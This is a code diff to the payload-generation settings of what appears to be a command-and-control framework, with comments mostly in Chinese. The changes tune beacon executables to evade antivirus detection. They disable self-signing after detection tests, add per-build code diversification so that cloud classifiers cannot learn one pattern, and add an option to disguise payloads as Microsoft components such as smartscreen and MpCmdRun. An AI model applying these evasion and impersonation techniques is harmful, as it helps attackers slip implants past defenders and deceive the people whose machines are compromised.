@@ -431,7 +431,9 @@ function GenerateUI(listeners_type)
     // "unsigned". Explicit true keeps the observable behaviour identical to before.
     // NOTE: checked != mandatory. If the teamserver lacks openssl/osslsigncode, signing is skipped
     // with a build-log line and the payload is still produced.
-    checkExePseudoSign.setChecked(true);
+    // ★ 默认改为**不勾**：自签名 Authenticode 实测会把产物直接推进查杀
+    //   （开 0/12 过 vs 关 7/9 过，且与证书主体无关）。要开随时勾上。
+    checkExePseudoSign.setChecked(false);
     checkExePseudoSign.setVisible(false);
 
     let checkPeHeaderMod = form.create_check("PE header mod (Rich header + timestamp + checksum)");
@@ -733,8 +735,10 @@ function BuildSchema(listener_type)
             // -- 进程与签名 ---------------------------------------------------
             { key: "svcname", label: "服务名", type: "text", group: "进程与签名", show_if: { format_in: ["Service Exe"] }, hint: "Service Exe 必填：pl_main.go:975 只是逐字符转义后串进 -DSERVICE_NAME，空值不报错，会生成一个装不上的服务" },
             { key: "iat_hiding", label: "IAT Hiding（无 CRT、空导入表）", type: "bool", group: "进程与签名", hint: "插件默认值来自 buildenv.mk 的 BEACON_IAT_HIDING_DEFAULT（见 pl_main.go:400）；开启后被 360 QVM 2.0 判为 HEUR/QVM.9B7A" },
-            { key: "exe_pseudo_sign", label: "Exe 伪 Authenticode 签名", type: "bool", group: "进程与签名", show_if: { format_in: ["Exe", "Service Exe"] }, hint: "随机自签名；服务端缺 openssl/osslsigncode 时跳过并记构建日志，不失败" },
+            { key: "exe_pseudo_sign", label: "Exe 伪 Authenticode 签名", type: "bool", group: "进程与签名", show_if: { format_in: ["Exe", "Service Exe"] }, hint: "★ 默认关。实测自签名会把产物推进查杀（开 0/12 过 vs 关 7/9 过），且换中性证书主体也救不了。只在一眼看上去需要\"有签名\"的场合勾" },
             { key: "pe_header_mod", label: "PE Header 改写（Rich header）", type: "bool", group: "进程与签名", show_if: { format_in: F_EXE }, hint: "默认跟随 buildenv.mk 的 BEACON_PE_HEADER_MOD=true；用 pe_header_mod.py 覆写 Rich header + 校验和 + 时间戳做 per-build 多样化。取消勾选即完全不跑这一步" },
+            { key: "diversify", label: "per-build 多样化（junk + decoy 导入）", type: "bool", group: "进程与签名", show_if: { format_in: F_EXE }, hint: "默认跟随 buildenv.mk 的 BEACON_DIVERSIFY=true；让每次生成的 .text/.idata 都不同，避免云模型收敛到单一模式。取消勾选则每次产物的代码段完全相同" },
+            { key: "disguise", label: "伪装成微软组件", type: "bool", group: "进程与签名", show_if: { format_in: F_EXE }, hint: "默认跟随 buildenv.mk 的 BEACON_DISGUISE=true；文件名 / 版本信息 / 签名主体三处同源地伪装成微软自家程序（smartscreen / MpCmdRun …）。取消则改用中性身份（虚构厂商 Northwind + 通用进程名），不冒充任何真实厂商" },
             // -- 信标窗口 ----------------------------------------------------
             { key: "is_killdate", label: "启用 killdate", type: "bool", group: "信标窗口" },
             { key: "kill_date", label: "killdate 日期", type: "text", group: "信标窗口", hint: "GMT 时间" },
